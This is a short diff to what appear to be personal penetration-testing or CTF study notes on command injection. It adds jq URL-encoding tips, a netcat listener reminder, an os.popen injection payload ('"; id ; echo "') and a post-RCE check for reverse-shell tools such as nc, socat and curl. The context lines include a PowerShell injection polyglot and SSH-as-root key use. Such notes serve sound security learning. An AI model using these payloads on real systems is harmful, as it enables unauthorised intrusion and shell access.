@@ -168,7 +168,20 @@ works with:
 	- chmod 700 key.txt and use it as a key using -i flag to ssh to root user
 ### command injection
 - (dir 2>&1 *`|echo CMD);&<# rem #>echo PowercShell
-- 
+- to translate a string into (uri)url encoding 
+	- jq -srR @uri < input
+		- s (slurp) - all into single array
+		- R - raw input
+		- r - raw output
+- nc -nvlp
+	- only accepts one connection and will cease after. ALWAYS prepare another listener every time you run a command
+	- os.popen('echo "wrong input: "; id ; echo ""')
+		-  inj - "; id ; echo "
+	- when access with rce, check /bin/sh to see what tools are available
+		- "; ls /usr/bin | grep -E 'nc|perl|python|socat|wget|curl' ; echo "
+		- ls /usr/bin | grep -E 'nc|perl|python|socat|wget|curl'
+
+
 
 >takeaway
 >dedicated web servers often runs with root/admin privileges as develops want to prevents permission issues
